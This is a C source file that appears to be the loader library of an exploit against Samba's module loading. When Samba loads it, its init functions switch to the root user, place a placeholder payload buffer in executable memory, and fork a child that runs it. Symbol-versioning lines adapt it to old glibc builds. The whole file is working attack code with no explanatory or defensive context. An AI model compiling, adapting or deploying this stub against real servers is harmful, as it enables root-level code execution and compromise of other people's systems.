#include <stdio.h>
#include <stdbool.h>
#include <unistd.h>
#include <sys/mman.h>
#include <string.h>
#include <signal.h>

#ifdef OLD_LIB_SET_1
__asm__(".symver mmap,mmap@GLIBC_2.0");
__asm__(".symver memcpy,memcpy@GLIBC_2.0");
__asm__(".symver fork,fork@GLIBC_2.0");
#endif

#ifdef OLD_LIB_SET_2
__asm__(".symver mmap,mmap@GLIBC_2.2.5");
__asm__(".symver memcpy,memcpy@GLIBC_2.2.5");
__asm__(".symver fork,fork@GLIBC_2.2.5");
#endif

#define PAYLOAD_SIZE 10000
unsigned char payload[PAYLOAD_SIZE] = {'P','A','Y','L','O','A','D',0};

extern bool change_to_root_user(void);

// Samba 4 looks for samba_init_module
int samba_init_module(void)
{
  void *mem;
  void (*fn)();

  change_to_root_user();
  mem = mmap(NULL, PAYLOAD_SIZE, PROT_READ|PROT_WRITE|PROT_EXEC, MAP_ANONYMOUS|MAP_PRIVATE, 0, 0);
  if (mem == MAP_FAILED)
    return 0;

  memcpy(mem, payload, PAYLOAD_SIZE);
  fn = (void(*)())mem;

  if (! fork()) {
    fn();
    kill(getpid(), 9);
  }
  return 0;
}

// Samba 3 looks for init_samba_module
int init_samba_module(void) {  return samba_init_module(); }
